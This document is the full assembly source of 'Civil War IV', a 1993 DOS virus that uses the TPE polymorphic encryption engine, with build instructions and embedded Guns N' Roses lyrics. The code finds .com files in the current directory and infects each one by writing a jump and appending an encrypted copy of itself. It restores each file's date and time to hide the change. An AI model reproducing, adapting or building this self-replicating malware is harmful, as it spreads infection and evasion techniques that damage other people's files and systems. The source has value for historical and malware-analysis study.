;****************************************************************************
;*   Civil War IV                                                           *
;*                                                                          *
;*   Assembled with Tasm 2.5                                                *
;*                                                                          *
;*   (c) Jan '93 Dark Helmet, The Netherlands.                              *
;*   The author takes no responsibilty for any damages caused by the virus  *
;*                                                                          *
;*   Example virus with the TPE engine (TPE version 1.3).                   *
;*   Use : TASM  CIVIL_4A                                                   *
;*         TLINK CIVIL_4A TPE                                               *
;*                                                                          *
;*--------------------------------------------------------------------------*
;*                                                                          *
;* This virus is NOT dedicated to Sara Gordon, but to all the innocent      *
;* people who are killed in Yugoslavia.                                     *
;*                                                                          *   
;* The text in the virus is taken from the song Civil War (hence the name)  *
;* of Guns and Roses, Use Your Illusion II, we hope they don't mind it.     *
;*                                                                          *
;* The first name for the virus was NAVIGATOR II, because the virus is      *
;* based on the NAVIGATOR virus (also written by me, a while back), but     *
;* since I decided to put the songtext in it I renamed it to Civil War IV   *
;*                                                                          *
;****************************************************************************

		.model tiny
		.radix 16
		.code
		
		extrn   rnd_init:near
		extrn   rnd_get:near
		extrn   crypt:near
		extrn   tpe_top:near

		org 100h

len             equ offset tpe_top - begin 

Dummy:          db 0e9h, 03h, 00h, 44h, 48h, 00h

Begin:          call virus                      ; calculate delta offset

Virus:          pop bp
		sub bp,offset virus
		
		mov dx,0fe00h                   ; DTA instellen
		mov ah,1ah
		int 21h
		
Restore_begin:  call rnd_init                   ; init random generator
		mov di,0100h
		lea si,ds:[buffer+bp]
		mov cx,06h
		rep movsb
				
First:          lea dx,[com_mask+bp]            ;get first COM file 
		mov ah,04eh
		xor cx,cx
		int 21h

Open_file:      mov ax,03d02h                   ;open for READ/WRITE
		mov dx,0fe1eh
		int 21h
		mov [handle+bp],ax
		xchg ax,bx

Read_date:      mov ax,05700h                   ;store date/time for later
		int 21h                         ;use
		mov [date+bp],dx
		mov [time+bp],cx

Check_infect:   mov bx,[handle+bp]              ;check if initials present in   
		mov ah,03fh                     ;file
		mov cx,06h
		lea dx,[buffer+bp]
		int 21h

		mov al,byte ptr [buffer+bp]+3   ;Compare initials
		mov ah,byte ptr [buffer+bp]+4 
		cmp ax,[initials+bp]
		jne infect_file                 ;if initials not present
						;start infecting file

Close_file:     mov bx,[handle+bp]              ;close file
		mov ah,3eh
		int 21h

Next_file:      mov ah,4fh                      ;get next COM file
		int 21h                         ;in directorie
		jnb open_file
		jmp exit

Infect_file:    mov ax,word ptr [cs:0fe1ah]     ;get lenght of file
		sub ax,03h
		mov [lenght+bp],ax
		mov ax,04200h                   ;goto begin of file
		call move_pointer
		
Write_jump:     mov ah,40h                      ;Write JUMP intruction
		mov cx,01h
		lea dx,[jump+bp]
		int 21h

		mov ah,40h                      ;Write JUMP offset
		mov cx,02h
		lea dx,[lenght+bp]
		int 21h

		mov ah,40                       ;Write initials to check
		mov cx,02h                      ;for infection later 
		lea dx,[initials+bp]
		int 21h
		
		mov  ax,4202h                   ; move to end of file
		call move_pointer               ; for infection

;*****************************************************************************
;                               T P E                                        *
;*****************************************************************************
	 
Encrypt:        push bp                         ; BP = delta offset
						; push delta offset on stack
						; for later use.

		mov ax,cs                       ; Calculate worksegment                 
		add ax,01000h
		mov es,ax                       ; ES point to decrypt virus
		
		lea dx,[begin+bp]               ; DS:DX begin encryption

		mov cx,len                      ; virus lenght  
						
		mov bp,[lenght+bp]              ; decryption starts at this 
		add bp,103h                     ; point

		xor si,si                       ; distance between decryptor
						; and encrypted code is 0 bytes

		call rnd_get                    ; AX = random value
		call crypt                      ; encrypt virus

		pop bp                          ; BP = delta offset
						; get delta offset of stack

;******************************************************************************
;                               T P E - E N D                                 *
;******************************************************************************

Write_virus:    mov bx,[handle+bp]
		mov ah,40h
		int 21h

Restore_date:   mov ax,05701h
		mov bx,[handle+bp]
		mov cx,[time+bp]
		mov dx,[date+bp]
		int 21h

Exit:           mov bx,0100h                    ; jump to start program
		jmp bx

;----------------------------------------------------------------------------

move_pointer:   mov bx,[handle+bp]
		xor cx,cx
		xor dx,dx
		int 21h
		ret
		
;----------------------------------------------------------------------------
v_name          db "Civil War IV, (c) 1993 "
com_mask        db "*.com",0
handle          dw ?
date            dw ?
time            dw ?
buffer          db 090h,0cdh,020h,044h,048h,00h
initials        dw 4844h         
lenght          dw ?
jump            db 0e9h,0
message         db "For all i'v seen has changed my mind"
		db "But still the wars go on as the years go by"
		db "With no love of God or human rights"
		db "'Cause all these dreams are swept aside"
		db "By bloody hands of the hypnotized"
		db "Who carry the cross of homicide"
		db "And history bears the scars of our Civil Wars." 
writer          db "[ DH / TridenT ]",00

		end  dummy
